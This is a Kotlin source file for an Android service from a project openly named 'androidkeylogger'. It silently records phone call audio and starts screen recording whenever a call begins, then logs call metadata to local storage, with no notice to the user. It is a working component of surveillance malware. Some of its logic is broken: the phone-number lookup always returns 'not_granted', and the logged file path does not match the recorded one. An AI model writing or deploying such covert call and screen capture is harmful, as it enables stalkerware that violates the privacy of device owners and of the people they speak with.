package com.azamovhudstc.androidkeylogger.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.text.format.DateFormat
import android.util.Log
import androidx.core.app.ActivityCompat
import com.azamovhudstc.androidkeylogger.model.CallRecord
import com.google.gson.Gson
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class CallRecordingService : Service() {
    private var mediaRecorder: MediaRecorder? = null
    private var startTimeMillis: Long = 0
    private val callRecordList = mutableListOf<CallRecord>()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
        return START_STICKY
    }

    private val phoneStateListener = object : PhoneStateListener() {
        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
            super.onCallStateChanged(state, phoneNumber)
            when (state) {
                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    Log.d("EVENT", "onCallStateChanged: ")
                    startRecording()
                    ScreenRecordService.startRecording(applicationContext)
                }
                TelephonyManager.CALL_STATE_IDLE -> {
                    Log.d("EVENT", "onCallStateChanged: STOPPED")
                    stopRecording()
                    ScreenRecordService.stopRecording(applicationContext)
                }
            }
        }
    }

    private fun startRecording() {
        if (mediaRecorder != null) {
            return
        }
        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        startTimeMillis = System.currentTimeMillis()
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audioManager.requestAudioFocus(
            null,
            AudioManager.STREAM_VOICE_CALL,
            AudioManager.AUDIOFOCUS_GAIN_TRANSIENT
        )


        mediaRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            setAudioSamplingRate(44100);
            try {
                setOutputFile(getExternalFilesDir(null)?.absolutePath + "/recorded_call_${Date().time}.mp3")
                prepare()
                start()
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }

    }

    private fun getOutputFile(): File {
        val callId = getCallId()
        val fileName = "${getPhoneNumber()}_${callId}.mp3"
        val dir = File(getExternalFilesDir(null), "call_records") // Aloqada papka yaratish
        if (!dir.exists()) {
            dir.mkdirs() // Agar papka mavjud emas bo'lsa, yaratish
        }
        return File(dir, fileName)
    }

    private fun getCallId(): String {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val callId = "${telephonyManager.networkOperatorName}_${UUID.randomUUID()}"
        return callId
    }

    private fun stopRecording() {
        mediaRecorder?.apply {
            stop()
            release()
        }
        mediaRecorder = null

        val endTimeMillis = System.currentTimeMillis()
        val durationMillis = endTimeMillis - startTimeMillis
        val dateFormat = SimpleDateFormat("HH:mm", Locale.getDefault())
        val endTimeString = dateFormat.format(Date())
        val startTimeString = dateFormat.format(startTimeMillis)
        val durationString = millisToMinutes(durationMillis)
        val phoneNumber =  "Unknown"
        val timestamp = System.currentTimeMillis()
        val dayTime = DateFormat.format("hh:mm:ss a - E dd/MM/yy", timestamp).toString()
        val fileName = "${phoneNumber}_${dayTime}.mp3"
        val fileLink = getOutputFile().absolutePath
        val callRecord =
            CallRecord(phoneNumber, startTimeString, endTimeString, durationString, fileLink)
        callRecordList.add(callRecord)

        saveCallRecordsToFile(callRecordList)
        Log.d(
            "EVENT",
            "stopRecording: ${fileLink} duration: $durationMillis, phoneNumber: $phoneNumber"
        )
    }


    private fun saveCallRecordsToFile(callRecords: List<CallRecord>) {
        val gson = Gson()
        val json = gson.toJson(callRecords)
        val file = File(getExternalFilesDir(null), "call_records.json")
        file.writeText(json)
    }

    private fun getPhoneNumber(): String? {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_PHONE_NUMBERS
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_PHONE_STATE
            ) != PackageManager.PERMISSION_GRANTED
        ) {

            "not_granted"
        } else   "not_granted"
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
    }

    fun millisToMinutes(millis: Long): String {
        val minutes = (millis / (1000 * 60)).toInt()
        val seconds = ((millis / 1000) % 60).toInt()
        return String.format("%02d:%02d", minutes, seconds)
    }
}

